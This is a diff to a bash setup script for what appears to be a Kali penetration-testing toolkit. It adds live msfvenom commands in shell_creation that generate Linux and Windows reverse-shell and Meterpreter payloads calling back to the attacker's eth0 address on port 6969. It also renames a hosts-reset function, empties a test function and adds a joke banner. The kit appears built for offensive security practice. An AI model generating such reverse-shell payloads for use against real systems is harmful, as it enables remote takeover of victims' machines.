@@ -268,7 +268,7 @@ c2_sliver_install() {
     return 0
 }
 
-hostfilereset() {
+scrub() {
     echo "127.0.0.1 localhost
 127.0.1.1   kali
 
@@ -399,10 +399,7 @@ system_update() {
 
 #Throw test cases into here, invoke with -test
 function test {
-    echo $(whoami) # The current user
-    echo "Kit.py Location: $kit_location"
-    echo $(sudo whoami) # This returns as root (since it's run as sudo)
-    echo "Test Completed"
+    #beepboop
 }
 
 function jon {
@@ -426,19 +423,34 @@ silence_pcbeep () { # I stop the ridiculous terminal beeping !
 shell_creation() {
   # This grabs the IP address of tun0 and uses it to start generating malicious binaries
   ## TODO: Create a method to select what interface you want to use
-  # ip_addr=$(ip addr show tun0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
-  # ip_addr=$(ip addr show eth0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
-  # This port is used for malicious binary generation
+  listen_port=6969
+  ip_addr=$(ip addr show eth0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
   # listen_port=6969
-  # ip_addr=$(ip addr show eth0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
-  # listen_port=6969
-  echo "Interface address is: $ip_addr"
-  echo "Port being used for shells is $listen_port"
-  echo "                           Nice"
-  # msfvenom -p linux/x64/shell_reverse_tcp RHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/test.elf
-  # msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/test.elf
-  # msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f exe > /tmp/test.exe
-  echo "Did I work? doubtful!"
+  echo -e "Interface address is: $ip_addr"
+  echo -e "Port being used for shells is $listen_port"
+  echo "                                                   Nice"
+  msfvenom -p linux/x64/shell_reverse_tcp RHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/test.elf
+  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/meter_rev_test.elf
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f exe > /tmp/test.exe
+  echo -e "Did I work? ${BLUE}doubtful! ${NC}"
+}
+
+shh() {
+  echo "                                                              "
+  echo "    88                                                88      "
+  echo "    88                                                88      "
+  echo "    88                                                88      "
+  echo "    88,dPPYba,  88       88  ,adPPYba,  8b,dPPYba,  88      "
+  echo "    88P'    '8a 88       88 a8'     '8a 88P'   'Y8  88      "
+  echo "    88       d8 88       88 8b       d8 88           88      "
+  echo "    88b,   ,a8' '8a,   ,a88 '8a,   ,a8' 88           88      "
+  echo "    8Y'Ybbd8''   'YbbdP'Y8  'YbbdP''   88           88      "
+  echo "                                                              "
+  echo "Never gonna give you up. Never gonna let you down.           "
+  echo "Never gonna run around and desert you.                       "
+  echo "Never gonna make you cry. Never gonna say goodbye.            "
+  echo "Never gonna tell a lie and hurt you.                          "
+  echo "                                                              "
 }
 
 
